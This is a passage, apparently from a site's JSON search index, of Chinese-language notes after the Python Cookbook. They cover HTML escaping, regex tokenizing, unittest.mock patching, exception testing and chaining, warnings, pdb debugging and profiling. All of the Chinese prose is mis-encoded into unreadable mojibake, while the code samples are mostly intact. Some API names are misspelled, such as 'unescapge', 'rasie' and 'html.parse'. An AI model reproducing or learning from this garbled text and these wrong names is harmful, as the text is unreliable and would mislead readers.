éœ€è¦è½¬æ¢æ–‡æœ¬ä¸­ç‰¹å®šçš„å­—ç¬¦ (æ¯”å¦‚ <, >, æˆ– &) å¯ä»¥ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/html åœ¨ç”Ÿæˆ HTML æˆ–è€… XML æ–‡æœ¬çš„æ—¶å€™ï¼Œå¦‚æœæ­£ç¡®çš„è½¬æ¢ç‰¹æ®Šæ ‡è®°å­—ç¬¦æ˜¯ä¸€ä¸ªå¾ˆå®¹ æ˜“è¢«å¿½è§†çš„ç»†èŠ‚ã€‚ ç‰¹åˆ«æ˜¯å½“ä½ ä½¿ç”¨ print() å‡½æ•°æˆ–è€…å…¶ä»–å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¥äº§ç”Ÿè¾“å‡ºçš„ æ—¶å€™ã€‚ ä½¿ç”¨åƒ html.escape() çš„å·¥å…·å‡½æ•°å¯ä»¥å¾ˆå®¹æ˜“çš„è§£å†³è¿™ç±»é—®é¢˜ã€‚ å¦‚æœä½ æƒ³ä»¥å…¶ä»–æ–¹å¼å¤„ç†æ–‡æœ¬ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„å·¥å…·å‡½æ•°æ¯”å¦‚ xml.sax.saxutils. unescapge() å¯ä»¥å¸®åŠ©ä½ ã€‚ ç„¶è€Œï¼Œä½ åº”è¯¥å…ˆè°ƒç ”æ¸…æ¥šæ€æ ·ä½¿ç”¨ä¸€ä¸ªåˆé€‚çš„è§£æå™¨ã€‚ æ¯” å¦‚ï¼Œå¦‚æœä½ åœ¨å¤„ç† HTML æˆ– XML æ–‡æœ¬ï¼Œ ä½¿ç”¨æŸä¸ªè§£ææ¨¡å—æ¯”å¦‚ html.parse æˆ– xml. etree.ElementTree å·²ç»å¸®ä½ è‡ªåŠ¨å¤„ç†äº†ç›¸å…³çš„æ›¿æ¢ç»†èŠ‚ã€‚ å­—ç¬¦ä¸²ä»¤ç‰Œè§£æ å‡å¦‚ä½ æœ‰ä¸‹é¢è¿™æ ·ä¸€ä¸ªæ–‡æœ¬å­—ç¬¦ä¸²: text = 'foo = 23 + 42 * 10' ä¸ºäº†ä»¤ç‰ŒåŒ–å­—ç¬¦ä¸²ï¼Œä½ ä¸ä»…éœ€è¦åŒ¹é…æ¨¡å¼ï¼Œè¿˜å¾—æŒ‡å®šæ¨¡å¼çš„ç±»å‹. ä¾‹: tokens = [('NAME', 'foo'), ('EQ','='), ('NUM', '23'), ('PLUS','+'), ('NUM', '42'), ('TIMES', '*'), ('NUM', '10')] åˆ©ç”¨å‘½åæ•è·ç»„çš„æ­£åˆ™è¡¨è¾¾å¼æ¥å®š ä¹‰æ‰€æœ‰å¯èƒ½çš„ä»¤ç‰Œï¼ŒåŒ…æ‹¬ç©ºæ ¼: import re NAME = r'(?P<NAME>[a-zA-Z_][a-zA-Z_0-9]*)' NUM = r'(?P<NUM>\\d+)' PLUS = r'(?P<PLUS>\\+)' TIMES = r'(?P<TIMES>\\*)' EQ = r'(?P<EQ>=)' WS = r'(?P<WS>\\s+)' master_pat = re.compile('|'.join([NAME, NUM, PLUS, TIMES, EQ, WS])) ?P<TOKENNAME> ç”¨äºç»™ä¸€ä¸ªæ¨¡å¼å‘½åï¼Œä¾›åé¢ä½¿ç”¨ ä½¿ç”¨ scanner() >>> scanner = master_pat.scanner('foo = 42') >>> scanner.match() <_sre.SRE_Match object at 0x100677738> >>> _.lastgroup, _.group() ('NAME', 'foo')","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-String-operation.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-String-operation.html"},{"title":"æµ‹è¯•ã€è°ƒè¯•å’Œå¼‚å¸¸","text":"è¯•éªŒè¿˜æ˜¯å¾ˆæ£’çš„ï¼Œä½†æ˜¯è°ƒè¯•ï¼Ÿå°±æ²¡é‚£ä¹ˆæœ‰è¶£äº†ã€‚äº‹å®æ˜¯ï¼Œåœ¨ Python æµ‹è¯•ä»£ç ä¹‹å‰ æ²¡æœ‰ç¼–è¯‘å™¨æ¥åˆ†æä½ çš„ä»£ç ï¼Œå› æ­¤ä½¿çš„æµ‹è¯•æˆä¸ºå¼€å‘çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ã€‚æœ¬ç« çš„ç›®æ ‡æ˜¯è®¨ è®ºä¸€äº›å…³äºæµ‹è¯•ã€è°ƒè¯•å’Œå¼‚å¸¸å¤„ç†çš„å¸¸è§é—®é¢˜ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯ä¸ºæµ‹è¯•é©±åŠ¨å¼€å‘æˆ–è€…å•å…ƒæµ‹ è¯•æ¨¡å—åšä¸€ä¸ªç®€è¦çš„ä»‹ç»ã€‚å› æ­¤ï¼Œç¬”è€…å‡å®šè¯»è€…ç†Ÿæ‚‰æµ‹è¯•æ¦‚å¿µã€‚ æµ‹è¯• stdout è¾“å‡º é—®é¢˜ ä½ çš„ç¨‹åºä¸­æœ‰ä¸ªæ–¹æ³•ä¼šè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸­ï¼ˆsys.stdoutï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒä¼šå°†æ–‡æœ¬æ‰“å° åˆ°å±å¹•ä¸Šé¢ã€‚ä½ æƒ³å†™ä¸ªæµ‹è¯•æ¥è¯æ˜å®ƒï¼Œç»™å®šä¸€ä¸ªè¾“å…¥ï¼Œç›¸åº”çš„è¾“å‡ºèƒ½æ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ã€‚ è§£å†³æ–¹æ¡ˆ ä½¿ç”¨ unittest.mock æ¨¡å—ä¸­çš„ patch() å‡½æ•°ï¼Œä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œå¯ä»¥ä¸ºå•ä¸ªæµ‹ è¯•æ¨¡æ‹Ÿ sys.stdout ç„¶åå›æ»šï¼Œå¹¶ä¸”ä¸äº§ç”Ÿå¤§é‡çš„ä¸´æ—¶å˜é‡æˆ–åœ¨æµ‹è¯•ç”¨ä¾‹ç›´æ¥æš´éœ²çŠ¶æ€ å˜é‡ã€‚ ä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬åœ¨ mymodule æ¨¡å—ä¸­å®šä¹‰å¦‚ä¸‹ä¸€ä¸ªå‡½æ•°: # mymodule.py def urlprint(protocol, host, domain): url = '{}://{}.{}'.format(protocol, host, domain) print(url) ä½¿ç”¨unitetestç›¸å…³å·¥å…·æµ‹è¯•: from io import StringIO from unittest import TestCase from unittest.mock import patch import mymodule class TestURLPrint(TestCase): def test_url_gets_to_stdout(self): protocol = 'http' host = 'www' domain = 'example.com' expected_url = '{}://{}.{}\\n'.format(protocol, host, domain) with patch('sys.stdout', new=StringIO()) as fake_out: mymodule.urlprint(protocol, host, domain) self.assertEqual(fake_out.getvalue(), expected_url) è®¨è®º urlprint() å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œæµ‹è¯•æ–¹æ³•å¼€å§‹ä¼šå…ˆè®¾ç½®æ¯ä¸€ä¸ªå‚æ•°çš„å€¼ã€‚ expected_url å˜é‡è¢«è®¾ç½®æˆåŒ…å«æœŸæœ›çš„è¾“å‡ºçš„å­—ç¬¦ä¸²ã€‚ unittest.mock.patch() å‡½æ•°è¢«ç”¨ä½œä¸€ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œä½¿ç”¨ StringIO å¯¹è±¡æ¥ä»£ æ›¿ sys.stdout . fake_out å˜é‡æ˜¯åœ¨è¯¥è¿›ç¨‹ä¸­è¢«åˆ›å»ºçš„æ¨¡æ‹Ÿå¯¹è±¡ã€‚åœ¨ with è¯­å¥ä¸­ä½¿ç”¨ å®ƒå¯ä»¥æ‰§è¡Œå„ç§æ£€æŸ¥ã€‚å½“ with è¯­å¥ç»“æŸæ—¶ï¼Œpatch ä¼šå°†æ‰€æœ‰ä¸œè¥¿æ¢å¤åˆ°æµ‹è¯•å¼€å§‹å‰çš„ çŠ¶æ€ã€‚æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯æŸäº›å¯¹ Python çš„ C æ‰©å±•å¯èƒ½ä¼šå¿½ç•¥æ‰ sys.stdout çš„é… ç½®äºŒç›´æ¥å†™å…¥åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚é™äºç¯‡å¹…ï¼Œæœ¬èŠ‚ä¸ä¼šæ¶‰åŠåˆ°è¿™æ–¹é¢çš„è®²è§£ï¼Œå®ƒé€‚ç”¨äºçº¯ Python ä»£ç ã€‚å¦‚æœä½ çœŸçš„éœ€è¦åœ¨ C æ‰©å±•ä¸­æ•è· I/Oï¼Œä½ å¯ä»¥å…ˆæ‰“å¼€ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œç„¶ åå°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°è¯¥æ–‡ä»¶ä¸­ã€‚ åœ¨å•å…ƒæµ‹è¯•ä¸­ç»™å¯¹è±¡æ‰“è¡¥ä¸ é—®é¢˜ ä½ å†™çš„å•å…ƒæµ‹è¯•ä¸­éœ€è¦ç»™æŒ‡å®šçš„å¯¹è±¡æ‰“è¡¥ä¸ï¼Œç”¨æ¥æ–­è¨€å®ƒä»¬åœ¨æµ‹è¯•ä¸­çš„æœŸæœ›è¡Œä¸º ï¼ˆæ¯”å¦‚ï¼Œæ–­è¨€è¢«è°ƒç”¨æ—¶çš„å‚æ•°ä¸ªæ•°ï¼Œè®¿é—®æŒ‡å®šçš„å±æ€§ç­‰ï¼‰ã€‚ è§£å†³æ–¹æ¡ˆ unittest.mock.patch() å‡½æ•°å¯è¢«ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚patch() è¿˜å¯è¢«ç”¨ä½œä¸€ä¸ª è£…é¥°å™¨ã€ä¸Šä¸‹æ–‡ç®¡ç†å™¨æˆ–å•ç‹¬ä½¿ç”¨ï¼Œå°½ç®¡å¹¶ä¸å¸¸è§ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå°†å®ƒå½“åšè£…é¥°å™¨ ä½¿ç”¨çš„ä¾‹å­: from unittest.mock import patch import example @patch('example.func') def test1(x, mock_func): example.func(x) # Uses patched example.func mock_func.assert_called_with(x) å®ƒè¿˜å¯ä»¥è¢«å½“åšä¸€ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨: with patch('example.func') as mock_func: example.func(x) # Uses patched example.func mock_func.assert_called_with(x) æœ€åï¼Œä½ è¿˜å¯ä»¥æ‰‹åŠ¨çš„ä½¿ç”¨å®ƒæ‰“è¡¥ä¸: p = patch('example.func') mock_func = p.start() example.func(x) mock_func.assert_called_with(x) p.stop() å¦‚æœå¯èƒ½çš„è¯ï¼Œä½ èƒ½å¤Ÿå åŠ è£…é¥°å™¨å’Œä¸Šä¸‹æ–‡ç®¡ç†å™¨æ¥ç»™å¤šä¸ªå¯¹è±¡æ‰“è¡¥ä¸ è®¨è®º patch() æ¥å—ä¸€ä¸ªå·²å­˜åœ¨å¯¹è±¡çš„å…¨è·¯å¾„åï¼Œå°†å…¶æ›¿æ¢ä¸ºä¸€ä¸ªæ–°çš„å€¼ã€‚åŸæ¥çš„å€¼ä¼šåœ¨ è£…é¥°å™¨å‡½æ•°æˆ–ä¸Šä¸‹æ–‡ç®¡ç†å™¨å®Œæˆåè‡ªåŠ¨æ¢å¤å›æ¥ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰å€¼ä¼šè¢« MagicMock å®ä¾‹æ›¿ä»£ã€‚ä¾‹å¦‚: >>> x = 42 >>> with patch('__main__.x'): ... print(x) ... <MagicMock name='x' id='4314230032'> >>> x 42 >>> ä¸è¿‡ï¼Œä½ å¯ä»¥é€šè¿‡ç»™ patch() æä¾›ç¬¬äºŒä¸ªå‚æ•°æ¥å°†å€¼æ›¿æ¢æˆä»»ä½•ä½ æƒ³è¦çš„: >>> x 42 >>> with patch('__main__.x', 'patched_value'): ... print(x) ... patched_value >>> x 42 >>> è¢«ç”¨æ¥ä½œä¸ºæ›¿æ¢å€¼çš„ MagicMock å®ä¾‹èƒ½å¤Ÿæ¨¡æ‹Ÿå¯è°ƒç”¨å¯¹è±¡å’Œå®ä¾‹ã€‚ä»–ä»¬è®°å½•å¯¹è±¡ çš„ä½¿ç”¨ä¿¡æ¯å¹¶å…è®¸ä½ æ‰§è¡Œæ–­è¨€æ£€æŸ¥ï¼Œ åœ¨å•å…ƒæµ‹è¯•ä¸­æµ‹è¯•å¼‚å¸¸æƒ…å†µ é—®é¢˜ ä½ æƒ³å†™ä¸ªæµ‹è¯•ç”¨ä¾‹æ¥å‡†ç¡®çš„åˆ¤æ–­æŸä¸ªå¼‚å¸¸æ˜¯å¦è¢«æŠ›å‡ºã€‚ è§£å†³æ–¹æ¡ˆ å¯¹äºå¼‚å¸¸çš„æµ‹è¯•å¯ä½¿ç”¨ assertRaises() æ–¹æ³•ã€‚ è®¨è®º assertRaises() æ–¹æ³•ä¸ºæµ‹è¯•å¼‚å¸¸å­˜åœ¨æ€§æä¾›äº†ä¸€ä¸ªç®€ä¾¿æ–¹æ³•ã€‚ä¸€ä¸ªå¸¸è§çš„é™·é˜±æ˜¯ æ‰‹åŠ¨å»è¿›è¡Œå¼‚å¸¸æ£€æµ‹ã€‚ æ¯”å¦‚: class TestConversion(unittest.TestCase): def test_bad_int(self): try: r = parse_int('N/A') except ValueError as e: self.assertEqual(type(e), ValueError) è¿™ç§æ–¹æ³•çš„é—®é¢˜åœ¨äºå®ƒå¾ˆå®¹æ˜“é—æ¼å…¶ä»–æƒ…å†µï¼Œæ¯”å¦‚æ²¡æœ‰ä»»ä½•å¼‚å¸¸æŠ›å‡ºçš„æ—¶å€™ã€‚é‚£ä¹ˆ ä½ è¿˜å¾—éœ€è¦å¢åŠ å¦å¤–çš„æ£€æµ‹è¿‡ç¨‹ï¼Œå¦‚ä¸‹é¢è¿™æ ·: class TestConversion(unittest.TestCase): def test_bad_int(self): try: r = parse_int('N/A') except ValueError as e: self.assertEqual(type(e), ValueError) else: self.fail('ValueError not raised') assertRaises() æ–¹æ³•ä¼šå¤„ç†æ‰€æœ‰ç»†èŠ‚ï¼Œå› æ­¤ä½ åº”è¯¥ä½¿ç”¨å®ƒã€‚ assertRaises() çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯å®ƒæµ‹ä¸äº†å¼‚å¸¸å…·ä½“çš„å€¼æ˜¯å¤šå°‘ã€‚ä¸ºäº†æµ‹è¯•å¼‚å¸¸å€¼ï¼Œ å¯ä»¥ä½¿ç”¨ assertRaisesRegex() æ–¹æ³•ï¼Œå®ƒå¯åŒæ—¶æµ‹è¯•å¼‚å¸¸çš„å­˜åœ¨ä»¥åŠé€šè¿‡æ­£åˆ™å¼åŒ¹é… å¼‚å¸¸çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚ assertRaises() å’Œ assertRaisesRegex() è¿˜æœ‰ä¸€ä¸ªå®¹æ˜“å¿½ç•¥çš„åœ°æ–¹å°±æ˜¯å®ƒä»¬è¿˜ èƒ½è¢«å½“åšä¸Šä¸‹æ–‡ç®¡ç†å™¨ä½¿ç”¨: class TestConversion(unittest.TestCase): def test_bad_int(self): with self.assertRaisesRegex(ValueError, 'invalid literal .*'): r = parse_int('N/A') å°†æµ‹è¯•è¾“å‡ºç”¨æ—¥å¿—è®°å½•åˆ°æ–‡ä»¶ä¸­ é—®é¢˜ ä½ å¸Œæœ›å°†å•å…ƒæµ‹è¯•çš„è¾“å‡ºå†™åˆ°åˆ°æŸä¸ªæ–‡ä»¶ä¸­å»ï¼Œè€Œä¸æ˜¯æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚ è§£å†³æ–¹æ¡ˆ è¿è¡Œå•å…ƒæµ‹è¯•ä¸€ä¸ªå¸¸è§æŠ€æœ¯å°±æ˜¯åœ¨æµ‹è¯•æ–‡ä»¶åº•éƒ¨åŠ å…¥ä¸‹é¢è¿™æ®µä»£ç ç‰‡æ®µ: import unittest class MyTest(unittest.TestCase): pass if __name__ == '__main__': unittest.main() è¿™æ ·çš„è¯æµ‹è¯•æ–‡ä»¶å°±æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¹¶ä¸”ä¼šå°†è¿è¡Œæµ‹è¯•çš„ç»“æœæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºä¸Šã€‚å¦‚ æœä½ æƒ³é‡å®šå‘è¾“å‡ºï¼Œå°±éœ€è¦åƒä¸‹é¢è¿™æ ·ä¿®æ”¹ main() å‡½æ•°: import sys def main(out=sys.stderr, verbosity=2): loader = unittest.TestLoader() suite = loader.loadTestsFromModule(sys.modules[__name__]) unittest.TextTestRunner(out,verbosity=verbosity).run(suite) if __name__ == '__main__': with open('testing.out', 'w') as f: main(f) è®¨è®º æœ¬èŠ‚æ„Ÿå…´è¶£çš„éƒ¨åˆ†å¹¶ä¸æ˜¯å°†æµ‹è¯•ç»“æœé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œæ˜¯é€šè¿‡è¿™æ ·åšå‘ä½  å±•ç¤ºäº† unittest æ¨¡å—ä¸­ä¸€äº›å€¼å¾—å…³æ³¨çš„å†…éƒ¨å·¥ä½œåŸç†ã€‚ å¿½ç•¥æˆ–æœŸæœ›æµ‹è¯•å¤±è´¥ å¤„ç†å¤šä¸ªå¼‚å¸¸ æ•è·æ‰€æœ‰å¼‚å¸¸ æƒ³è¦æ•è·æ‰€æœ‰çš„å¼‚å¸¸ï¼Œå¯ä»¥ç›´æ¥æ•è· Exception å°†ä¼šæ•è·é™¤äº† SystemExit ã€KeyboardInterrupt å’Œ GeneratorExit ä¹‹å¤–çš„ æ‰€æœ‰å¼‚å¸¸ã€‚å¦‚æœä½ è¿˜æƒ³æ•è·è¿™ä¸‰ä¸ªå¼‚å¸¸ï¼Œå°† Exception æ”¹æˆ BaseException å³å¯ åº”è¯¥å°½å¯èƒ½å°†å¼‚å¸¸å¤„ç†å™¨å®šä¹‰çš„ç²¾å‡†ä¸€äº›ã€‚ åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸ è‡ªå®šä¹‰å¼‚å¸¸ç±»åº”è¯¥æ€»æ˜¯ç»§æ‰¿è‡ªå†…ç½®çš„ Exception ç±»ï¼Œæˆ–è€…æ˜¯ç»§æ‰¿è‡ªé‚£äº›æœ¬èº«å°±æ˜¯ ä» Exception ç»§æ‰¿è€Œæ¥çš„ç±»ã€‚ æ•è·å¼‚å¸¸åæŠ›å‡ºå¦å¤–çš„å¼‚å¸¸ é—®é¢˜ ä½ æƒ³æ•è·ä¸€ä¸ªå¼‚å¸¸åæŠ›å‡ºå¦å¤–ä¸€ä¸ªä¸åŒçš„å¼‚å¸¸ï¼ŒåŒæ—¶è¿˜å¾—åœ¨å¼‚å¸¸å›æº¯ä¸­ä¿ç•™ä¸¤ä¸ª å¼‚å¸¸çš„ä¿¡æ¯ã€‚ è§£å†³æ–¹æ¡ˆ ä¸ºäº†é“¾æ¥å¼‚å¸¸ï¼Œä½¿ç”¨ raise from è¯­å¥æ¥ä»£æ›¿ç®€å•çš„ raise è¯­å¥ã€‚å®ƒä¼šè®©ä½ åŒæ—¶ä¿ ç•™ä¸¤ä¸ªå¼‚å¸¸çš„ä¿¡æ¯ã€‚ä¾‹å¦‚: >>> def example(): ... try: ... int('N/A') ... except ValueError as e: ... raise RuntimeError('A parsing error occurred') from e ... >>> example() Traceback (most recent call last): File \"<stdin>\", line 3, in example ValueError: invalid literal for int() with base 10: 'N/A' Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"<stdin>\", line 5, in example RuntimeError: A parsing error occurred >>> å¦‚æœï¼Œä½ æƒ³å¿½ç•¥æ‰å¼‚å¸¸é“¾ï¼Œå¯ä½¿ç”¨ raise from None è®¨è®º åœ¨è®¾è®¡ä»£ç æ—¶ï¼Œåœ¨å¦å¤–ä¸€ä¸ª except ä»£ç å—ä¸­ä½¿ç”¨ raise è¯­å¥çš„æ—¶å€™ä½ è¦ç‰¹åˆ«å°å¿ƒ äº†ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ç§ raise è¯­å¥éƒ½åº”è¯¥è¢«æ”¹æˆ raise from è¯­å¥ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ åº”è¯¥ ä½¿ç”¨ä¸‹é¢è¿™ç§å½¢å¼: try: ... except SomeException as e: raise DifferentException() from e è¿™æ ·åšçš„åŸå› æ˜¯ä½ åº”è¯¥æ˜¾ç¤ºçš„å°†åŸå› é“¾æ¥èµ·æ¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒDifferentException æ˜¯ç›´æ¥ä» SomeException è¡ç”Ÿè€Œæ¥ã€‚è¿™ç§å…³ç³»å¯ä»¥ä»å›æº¯ç»“æœä¸­çœ‹å‡ºæ¥ã€‚ é‡æ–°æŠ›å‡ºè¢«æ•è·çš„å¼‚å¸¸ ç®€å•çš„ä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„ rasie è¯­å¥å³å¯ è¾“å‡ºè­¦å‘Šä¿¡æ¯ ä½¿ç”¨ warning.warn() å‡½æ•° warn() çš„å‚æ•°æ˜¯ä¸€ä¸ªè­¦å‘Šæ¶ˆæ¯å’Œä¸€ä¸ªè­¦å‘Šç±»ï¼Œè­¦å‘Šç±»æœ‰å¦‚ä¸‹å‡ ç§ï¼š UserWarning DeprecationWarning SyntaxWarning RuntimeWarning ResourceWarning FutureWarning. å¯¹è­¦å‘Šçš„å¤„ç†å–å†³äºä½ å¦‚ä½•è¿è¡Œè§£é‡Šå™¨ä»¥åŠä¸€äº›å…¶ä»–é…ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ ä½¿ç”¨ -W all é€‰é¡¹å»è¿è¡Œ Pythonï¼Œä½ ä¼šå¾—åˆ°å¦‚ä¸‹çš„è¾“å‡º: bash % python3 -W all example.py example.py:5: DeprecationWarning: logfile argument is deprecated warnings.warn('logfile argument is deprecated', DeprecationWarning) é€šå¸¸æ¥è®²ï¼Œè­¦å‘Šä¼šè¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯ä¸Šã€‚å¦‚æœä½ æƒ³è®²è­¦å‘Šè½¬æ¢ä¸ºå¼‚å¸¸ï¼Œå¯ä»¥ä½¿ç”¨ -W error é€‰é¡¹: bash % python3 -W error example.py Traceback (most recent call last): File \"example.py\", line 10, in <module> func(2, 3, logfile='log.txt') File \"example.py\", line 5, in func warnings.warn('logfile argument is deprecated', DeprecationWarning) DeprecationWarning: logfile argument is deprecated bash % é»˜è®¤æƒ…å†µä¸‹ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰è­¦å‘Šæ¶ˆæ¯éƒ½ä¼šå‡ºç°. -W é€‰é¡¹èƒ½æ§åˆ¶è­¦å‘Šæ¶ˆæ¯çš„è¾“å‡º. -W all ä¼šè¾“å‡ºæ‰€æœ‰è­¦å‘Šæ¶ˆæ¯ -W ignore å¿½ç•¥æ‰æ‰€æœ‰è­¦å‘Š -W error å°†è­¦å‘Šè½¬æ¢æˆå¼‚å¸¸ å¦å¤–ä¸€ç§é€‰æ‹©ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨ warnings.simplefilter() å‡½æ•°æ§åˆ¶è¾“å‡º: always å‚æ•°ä¼šè®©æ‰€æœ‰è­¦å‘Šæ¶ˆæ¯å‡ºç° ignore å¿½ç•¥è°ƒæ‰€æœ‰çš„è­¦å‘Š error å°†è­¦å‘Šè½¬æ¢æˆå¼‚å¸¸ã€‚ è°ƒè¯•åŸºæœ¬çš„ç¨‹åºå´©æºƒé”™è¯¯ ä½¿ç”¨: python3 -i sample.py åœ¨æ‰§è¡Œç»“æŸæ—¶æ‰“å¼€äº¤äº’å¼çª—å£æŸ¥çœ‹ç¯å¢ƒ ä¹Ÿå¯ä»¥åœ¨ç¨‹åºå´©æºƒåæ‰“å¼€ Python çš„è°ƒè¯•å™¨ã€‚ä¾‹å¦‚: >>> import pdb >>> pdb.pm() > sample.py(4)func() -> return n + 10 (Pdb) w sample.py(6)<module>() -> func('Hello') > sample.py(4)func() -> return n + 10 (Pdb) print n 'Hello' (Pdb) q >>> å¦‚æœä½ çš„ä»£ç æ‰€åœ¨çš„ç¯å¢ƒå¾ˆéš¾è·å–äº¤äº’ shellï¼ˆæ¯”å¦‚åœ¨æŸä¸ªæœåŠ¡å™¨ä¸Šé¢ï¼‰ï¼Œé€šå¸¸å¯ä»¥ æ•è·å¼‚å¸¸åè‡ªå·±æ‰“å°è·Ÿè¸ªä¿¡æ¯ã€‚ä¾‹å¦‚: import traceback import sys try: func(arg) except: print('**** AN ERROR OCCURRED ****') traceback.print_exc(file=sys.stderr) è¦æ˜¯ä½ çš„ç¨‹åºæ²¡æœ‰å´©æºƒï¼Œè€Œåªæ˜¯äº§ç”Ÿäº†ä¸€äº›ä½ çœ‹ä¸æ‡‚çš„ç»“æœï¼Œä½ åœ¨æ„Ÿå…´è¶£çš„åœ°æ–¹æ’ å…¥ä¸€ä¸‹ print() è¯­å¥ä¹Ÿæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ä¸è¿‡ï¼Œè¦æ˜¯ä½ æ‰“ç®—è¿™æ ·åšï¼Œæœ‰ä¸€äº›å°æŠ€å·§å¯ ä»¥å¸®åŠ©ä½ ã€‚é¦–å…ˆï¼Œtraceback.print_stack() å‡½æ•°ä¼šä½ ç¨‹åºè¿è¡Œåˆ°é‚£ä¸ªç‚¹çš„æ—¶å€™åˆ›å»º ä¸€ä¸ªè·Ÿè¸ªæ ˆã€‚ å¯ä½¿ç”¨ pdb.set_trace() åœ¨ä»»ä½•åœ°æ–¹æ‰‹åŠ¨çš„å¯åŠ¨è°ƒè¯•å™¨ ç»™ä½ çš„ç¨‹åºåšæ€§èƒ½æµ‹è¯• é—®é¢˜ Â·ä½ æƒ³æµ‹è¯•ä½ çš„ç¨‹åºè¿è¡Œæ‰€èŠ±è´¹çš„æ—¶é—´å¹¶åšæ€§èƒ½æµ‹è¯•ã€‚ è§£å†³æ–¹æ¡ˆ å¦‚æœä½ åªæ˜¯ç®€å•çš„æƒ³æµ‹è¯•ä¸‹ä½ çš„ç¨‹åºæ•´ä½“èŠ±è´¹çš„æ—¶é—´ï¼Œé€šå¸¸ä½¿ç”¨ Unix æ—¶é—´å‡½æ•°timeå°± è¡Œäº†: bash % time python3 someprogram.py real 0m13.937s user 0m12.162s sys 0m0.098s bash % å¦‚æœä½ è¿˜éœ€è¦ä¸€ä¸ªç¨‹åºå„ä¸ªç»†èŠ‚çš„è¯¦ç»†æŠ¥å‘Šï¼Œå¯ä»¥ä½¿ç”¨ cProfile æ¨¡å—: bash % python3 -m cProfile someprogram.py 859647 function calls in 16.016 CPU seconds Ordered by: standard name ncalls tottime percall cumtime percall filename:lineno(function) 263169 0.080 0.000 0.080 0.000 someprogram.py:16(frange) 513 0.001 0.000 0.002 0.000 someprogram.py:30(generate_ , â†’mandel) 262656 0.194 0.000 15.295 0.000 someprogram.py:32(<genexpr>) 1 0.036 0.036 16.077 16.077 someprogram.py:4(<module>) 262144 15.021 0.000 15.021 0.000 someprogram.py:4(in_mandelbrot) 1 0.000 0.000 0.000 0.000 os.py:746(urandom) 1 0.000 0.000 0.000 0.000 png.py:1056(_readable) 1 0.000 0.000 0.000 0.000 png.py:1073(Reader) 1 0.227 0.227 0.438 0.438 png.py:163(<module>) 512 0.010 0.000 0.010 0.000 png.py:200(group) ... bash % ä¸è¿‡é€šå¸¸æƒ…å†µæ˜¯ä»‹äºè¿™ä¸¤ä¸ªæç«¯ä¹‹é—´ã€‚æ¯”å¦‚ä½ å·²ç»çŸ¥é“ä»£ç è¿è¡Œæ—¶åœ¨å°‘æ•°å‡ ä¸ªå‡½ æ•°ä¸­èŠ±è´¹äº†ç»å¤§éƒ¨åˆ†æ—¶é—´ã€‚å¯¹äºè¿™äº›å‡½æ•°çš„æ€§èƒ½æµ‹è¯•ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªç®€å•çš„è£…é¥°å™¨: start = time.perf_counter() r = func(*args, **kwargs) end = time.perf_counter() å¯¹äºæµ‹è¯•å¾ˆå°çš„ä»£ç ç‰‡æ®µè¿è¡Œæ€§èƒ½ï¼Œä½¿ç”¨ timeit æ¨¡å—ä¼šå¾ˆæ–¹ä¾¿ï¼Œä¾‹å¦‚: >>> from timeit import timeit >>> timeit('math.sqrt(2)', 'import math') 0.1432319980012835 >>> timeit('sqrt(2)', 'from math import sqrt') 0.10836604500218527 >>> timeit ä¼šæ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°ä¸­è¯­å¥ 100 ä¸‡æ¬¡å¹¶è®¡ç®—è¿è¡Œæ—¶é—´ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿è¡Œæµ‹ è¯•ä¹‹å‰é…ç½®ç¯å¢ƒã€‚å¦‚æœä½ æƒ³æ”¹å˜å¾ªç¯æ‰§è¡Œæ¬¡æ•°ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·è®¾ç½® number å‚æ•°çš„å€¼: >>> timeit('math.sqrt(2)', 'import math', number=10000000) 1.434852126003534 >>> timeit('sqrt(2)', 'from math import sqrt', number=10000000) 1.0270336690009572 >>> è®¨è®º å½“æ‰§è¡Œæ€§èƒ½æµ‹è¯•çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä½ è·å–çš„ç»“æœéƒ½æ˜¯è¿‘ä¼¼å€¼ã€‚time. 